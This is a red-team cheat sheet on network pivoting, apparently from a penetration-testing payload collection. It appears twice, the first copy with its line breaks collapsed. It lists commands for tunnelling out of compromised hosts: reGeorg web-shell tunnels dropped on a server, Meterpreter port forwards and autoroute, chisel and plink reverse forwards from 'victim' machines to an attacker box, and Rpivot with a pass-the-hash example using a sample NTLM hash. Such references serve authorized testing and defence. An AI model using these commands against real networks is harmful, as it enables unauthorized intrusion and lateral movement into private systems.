# Network Pivoting Techniques

## Summary

## Windows netsh Port Forwarding

    netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destportnetsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110

1. listenaddress – is a local IP address waiting for a connection.
2. listenport – local listening TCP port (the connection is waited on it).
3. connectaddress – is a local or remote IP address (or DNS name) to which the incoming connection will be redirected.
4. connectport – is a TCP port to which the connection from listenport is forwarded to.

## SSH

### SOCKS Proxy

    ssh -D8080 [user]@[host]ssh -N -f -D 9000 [user]@[host]-f : ssh in background-N : do not execute a remote command

Cool Tip : Konami SSH Port forwarding

    [ENTER] + [~C]-D 1090

### Local Port Forwarding

    ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]

### Remote Port Forwarding

    ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]ssh -R 3389:10.1.1.224:3389 root@10.11.0.32

## Proxychains

**Config file**: /etc/proxychains.conf

    [ProxyList]socks4 localhost 8080

Set the SOCKS4 proxy then `proxychains nmap -sT 192.168.5.6`

## Web SOCKS - reGeorg

[reGeorg](https://github.com/sensepost/reGeorg), the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.

Drop one of the following files on the server:

- tunnel.ashx
- tunnel.aspx
- tunnel.js
- tunnel.jsp
- tunnel.nosocket.php
- tunnel.php
- tunnel.tomcat.5.jsp

    python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp # the socks proxy will be on port 8080optional arguments:-h, --help           show this help message and exit-l , --listen-on     The default listening address-p , --listen-port   The default listening port-r , --read-buff     Local read buffer, max data to be sent per POST-u , --url           The url containing the tunnel script-v , --verbose       Verbose output[INFO|DEBUG]

## Metasploit

    # Meterpreter list active port forwardsportfwd list# Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shellportfwd add –l 3389 –p 3389 –r target-hostportfwd add -l 88 -p 88 -r 127.0.0.1portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445# Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shellportfwd delete –l 3389 –p 3389 –r target-host# Meterpreter delete all port forwardsportfwd flushor# Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0run autoroute -s 192.168.15.0/24use auxiliary/server/socks4a# Meterpreter list all active routesrun autoroute -proute #Meterpreter view available networks the compromised host can access# Meterpreter add route for 192.168.14.0/24 via Session number.route add 192.168.14.0 255.255.255.0 3# Meterpreter delete route for 192.168.14.0/24 via Session number.route delete 192.168.14.0 255.255.255.0 3# Meterpreter delete all routesroute flush

## sshuttle

Transparent proxy server that works as a poor man’s VPN. Forwards over ssh.

- Doesn’t require admin.
- Works with Linux and MacOS.
- Supports DNS tunneling.

    pacman -Sy sshuttleapt-get install sshuttlesshuttle -vvr user@10.10.10.10 10.1.1.0/24sshuttle -vvr username@pivot_host 10.2.2.0/24

## chisel

    go get -v github.com/jpillora/chisel# forward port 389 and 88 to hacker computeruser@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389user@hacker$ /opt/chisel/chisel server -p 8008 --reverse

## Rpivot

Server (Attacker box)

    python server.py --proxy-port 1080 --server-port 9443 --server-ip 0.0.0.0

Client (Compromised box)

    python client.py --server-ip <ip> --server-port 9443

Through corporate proxy

    python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \--ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e

Passing the hash

    python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \--ntlm-proxy-port 8080 --domain CORP --username jdoe \--hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE

## plink

    # exposes the SMB port of the machine in the port 445 of the SSH Serverplink -l root -pw toor -R 445:127.0.0.1:445# exposes the RDP port of the machine in the port 3390 of the SSH Serverplink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389plink -l root -pw mypassword 192.168.18.84 -Rplink.exe -v -pw mypassword user@10.10.10.10 -L 6666:127.0.0.1:445plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]# redirects the Windows port 445 to Kali on port 22plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185

## ngrok

    # get the binarywget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zipunzip ngrok-stable-linux-amd64.zip# log into the service./ngrok authtoken 3U[REDACTED_TOKEN]Hm# deploy a port forwarding for 4433./ngrok http 4433./ngrok tcp 4433

## Basic Pivoting Types

[Untitled](Network%20Pivoting%20Techniques/Untitled%20Database.csv)

### Listen - Listen

[Untitled](Network%20Pivoting%20Techniques/Untitled%20Database%201.csv)

### Listen - Connect

[Untitled](Network%20Pivoting%20Techniques/Untitled%20Database%202.csv)

### Connect - Connect

[Untitled](Network%20Pivoting%20Techniques/Untitled%20Database%203.csv)

## References

- [Network Pivoting Techniques - Bit rot](https://bitrot.sh/cheatsheet/14-12-2017-pivoting/)
- [Port Forwarding in Windows - Windows OS Hub](http://woshub.com/port-forwarding-in-windows/)
- [Using the SSH “Konami Code” (SSH Control Sequences) - Jeff McJunkin](https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences)
- [A Red Teamer’s guide to pivoting- Mar 23, 2017 - Artem Kondratenko](https://artkond.com/2017/03/23/pivoting-guide/)
- [Pivoting Meterpreter](https://www.information-security.fr/pivoting-meterpreter/)
- [Etat de l’art du pivoting réseau en 2019 - Oct 28,2019 - Alexandre Zanni](https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/)

# Network Pivoting Techniques

## Summary

- [Windows netsh Port Forwarding](file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#windows-netsh-port-forwarding)
- [SSH](file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#ssh)
    - [SOCKS Proxy](file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#socks-proxy)
    - [Local Port Forwarding](file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#local-port-forwarding)
    - [Remote Port Forwarding](file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#remote-port-forwarding)
- [Proxychains](file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#proxychains)
- [Web SOCKS - reGeorg](file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#web-socks---regeorg)
- [Metasploit](file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#metasploit)
- [sshuttle](file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#sshuttle)
- [chisel](file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#chisel)
- [Rpivot](file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#rpivot)
- [plink](file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#plink)
- [ngrok](file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#ngrok)
- [Basic Pivoting Types](file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#basic-pivoting-types)
    - [Listen - Listen](file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#listen---listen)
    - [Listen - Connect](file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#listen---connect)
    - [Connect - Connect](file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#connect---connect)
- [References](file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#references)

## Windows netsh Port Forwarding

    netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
    
    netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110

1. listenaddress – is a local IP address waiting for a connection.
2. listenport – local listening TCP port (the connection is waited on it).
3. connectaddress – is a local or remote IP address (or DNS name) to which the incoming connection will be redirected.
4. connectport – is a TCP port to which the connection from listenport is forwarded to.

## SSH

### SOCKS Proxy

    ssh -D8080 [user]@[host]
    
    ssh -N -f -D 9000 [user]@[host]
    -f : ssh in background
    -N : do not execute a remote command

Cool Tip : Konami SSH Port forwarding

    [ENTER] + [~C]
    -D 1090

### Local Port Forwarding

    ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]

### Remote Port Forwarding

    ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]
    ssh -R 3389:10.1.1.224:3389 root@10.11.0.32

## Proxychains

**Config file**: /etc/proxychains.conf

    [ProxyList]
    socks4 localhost 8080

Set the SOCKS4 proxy then `proxychains nmap -sT 192.168.5.6`

## Web SOCKS - reGeorg

[reGeorg](https://github.com/sensepost/reGeorg), the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.

Drop one of the following files on the server:

- tunnel.ashx
- tunnel.aspx
- tunnel.js
- tunnel.jsp
- tunnel.nosocket.php
- tunnel.php
- tunnel.tomcat.5.jsp

    python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp # the socks proxy will be on port 8080
    
    optional arguments:
      -h, --help           show this help message and exit
      -l , --listen-on     The default listening address
      -p , --listen-port   The default listening port
      -r , --read-buff     Local read buffer, max data to be sent per POST
      -u , --url           The url containing the tunnel script
      -v , --verbose       Verbose output[INFO|DEBUG]

## Metasploit

    # Meterpreter list active port forwards
    portfwd list 
    
    # Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
    portfwd add –l 3389 –p 3389 –r target-host 
    portfwd add -l 88 -p 88 -r 127.0.0.1
    portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445
    
    # Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
    portfwd delete –l 3389 –p 3389 –r target-host 
    # Meterpreter delete all port forwards
    portfwd flush 
    
    or
    
    # Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0
    run autoroute -s 192.168.15.0/24 
    use auxiliary/server/socks4a
    
    # Meterpreter list all active routes
    run autoroute -p 
    
    route #Meterpreter view available networks the compromised host can access
    # Meterpreter add route for 192.168.14.0/24 via Session number.
    route add 192.168.14.0 255.255.255.0 3 
    # Meterpreter delete route for 192.168.14.0/24 via Session number.
    route delete 192.168.14.0 255.255.255.0 3 
    # Meterpreter delete all routes
    route flush

## sshuttle

Transparent proxy server that works as a poor man's VPN. Forwards over ssh.

- Doesn't require admin.
- Works with Linux and MacOS.
- Supports DNS tunneling.

    pacman -Sy sshuttle
    apt-get install sshuttle
    sshuttle -vvr user@10.10.10.10 10.1.1.0/24
    sshuttle -vvr username@pivot_host 10.2.2.0/24

## chisel

    go get -v github.com/jpillora/chisel
    
    # forward port 389 and 88 to hacker computer
    user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 
    user@hacker$ /opt/chisel/chisel server -p 8008 --reverse

## Rpivot

Server (Attacker box)

    python server.py --proxy-port 1080 --server-port 9443 --server-ip 0.0.0.0

Client (Compromised box)

    python client.py --server-ip <ip> --server-port 9443

Through corporate proxy

    python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \
    --ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e

Passing the hash

    python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \
    --ntlm-proxy-port 8080 --domain CORP --username jdoe \
    --hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE

## plink

    # exposes the SMB port of the machine in the port 445 of the SSH Server
    plink -l root -pw toor -R 445:127.0.0.1:445 
    # exposes the RDP port of the machine in the port 3390 of the SSH Server
    plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389  
    
    plink -l root -pw mypassword 192.168.18.84 -R
    plink.exe -v -pw mypassword user@10.10.10.10 -L 6666:127.0.0.1:445
    
    plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
    # redirects the Windows port 445 to Kali on port 22
    plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185

## ngrok

    # get the binary
    wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
    unzip ngrok-stable-linux-amd64.zip 
    
    # log into the service
    ./ngrok authtoken 3U[REDACTED_TOKEN]Hm
    
    # deploy a port forwarding for 4433
    ./ngrok http 4433
    ./ngrok tcp 4433

## Basic Pivoting Types

[Untitled](Network%20Pivoting%20Techniques/Untitled%20Database%204.csv)

### Listen - Listen

[Untitled](Network%20Pivoting%20Techniques/Untitled%20Database%205.csv)

### Listen - Connect

[Untitled](Network%20Pivoting%20Techniques/Untitled%20Database%206.csv)

### Connect - Connect

[Untitled](Network%20Pivoting%20Techniques/Untitled%20Database%207.csv)

## References

- [Network Pivoting Techniques - Bit rot](https://bitrot.sh/cheatsheet/14-12-2017-pivoting/)
- [Port Forwarding in Windows - Windows OS Hub](http://woshub.com/port-forwarding-in-windows/)
- [Using the SSH "Konami Code" (SSH Control Sequences) - Jeff McJunkin](https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences)
- [A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko](https://artkond.com/2017/03/23/pivoting-guide/)
- [Pivoting Meterpreter](https://www.information-security.fr/pivoting-meterpreter/)
- [Etat de l’art du pivoting réseau en 2019 - Oct 28,2019 - Alexandre Zanni](https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/)